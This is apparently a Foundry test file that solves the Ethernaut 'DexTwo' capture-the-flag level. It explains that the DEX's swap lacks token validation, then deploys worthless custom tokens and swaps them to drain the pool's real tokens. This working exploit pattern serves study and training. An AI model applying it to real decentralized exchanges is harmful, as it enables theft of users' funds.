// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/DexTwo/DexTwoFactory.sol";
import "../src/Ethernaut.sol";

contract DexTwoTest is Test {
    Ethernaut ethernaut;
    address player = address(100);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(player, 5 ether); // give our player 5 ether
    }

    function testDexTwoHack() public {
        /****************
         * Factory setup *
         *************** */
        DexTwoFactory dexTwoFactory = new DexTwoFactory();
        ethernaut.registerLevel(dexTwoFactory);
        vm.startPrank(player);
        address levelAddress = ethernaut.createLevelInstance(dexTwoFactory);
        DexTwo ethernautDexTwo = DexTwo(payable(levelAddress));
        /****************
         *    Attack     *
         *************** */
        /*
         * In the level, a hint is to check the difference with Dex and DexTwo.
         * An important piece you can notice is in swap where the following check has been remove:
         * require(
         *    (from == token1 && to == token2) ||
         *        (from == token2 && to == token1),
         *    "Invalid tokens"
         * );
         * Now, there is no validation whether the token passed it token1 OR token2.
         * We can then issue our own token and use it maliciously.
         * Here is the walkthrough
         * 1) Get the address of the 2 first tokens
         * 2) Create 2 malicious tokens
         * 3) approve them
         * 4) transfer these tokens
         * 5) swap both malicious tokens for "real" tokens
         */

        // -- 1 --
        address token1 = ethernautDexTwo.token1();
        address token2 = ethernautDexTwo.token2();
        // make sure we start witht 10 tokens
        emit log_named_uint(
            "DEX -- Initial Balance -- Token 1",
            ethernautDexTwo.balanceOf(token1, address(ethernautDexTwo))
        );
        emit log_named_uint(
            "DEX -- Initial Balance -- Token 2",
            ethernautDexTwo.balanceOf(token2, address(ethernautDexTwo))
        );
        assertEq(ethernautDexTwo.balanceOf(token1, player), 10);
        assertEq(ethernautDexTwo.balanceOf(token2, player), 10);

        // -- 2 --
        SwappableTokenTwo maliciousToken1 = new SwappableTokenTwo(
            "Malicious Token 1",
            "MT1",
            100
        );
        SwappableTokenTwo maliciousToken2 = new SwappableTokenTwo(
            "Malicious Token 2",
            "MT2",
            100
        );

        // -- 3 --
        maliciousToken1.approve(address(ethernautDexTwo), 2**256 - 1);
        maliciousToken2.approve(address(ethernautDexTwo), 2**256 - 1);

        // -- 4 --
        maliciousToken1.transfer(address(ethernautDexTwo), 1);
        maliciousToken2.transfer(address(ethernautDexTwo), 1);

        // -- 5 --
        ethernautDexTwo.swap(address(maliciousToken1), address(token1), 1);
        ethernautDexTwo.swap(address(maliciousToken2), address(token2), 1);

        emit log_named_uint(
            "DEX -- Final Balance -- Token 1",
            ethernautDexTwo.balanceOf(token1, address(ethernautDexTwo))
        );
        emit log_named_uint(
            "DEX -- Final Balance -- Token 2",
            ethernautDexTwo.balanceOf(token2, address(ethernautDexTwo))
        );
        // we drained the 100 tokens available
        assertEq(ethernautDexTwo.balanceOf(token1, player), 110);
        assertEq(ethernautDexTwo.balanceOf(token2, player), 110);
        /*****************
         *Level Submission*
         ***************  */
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
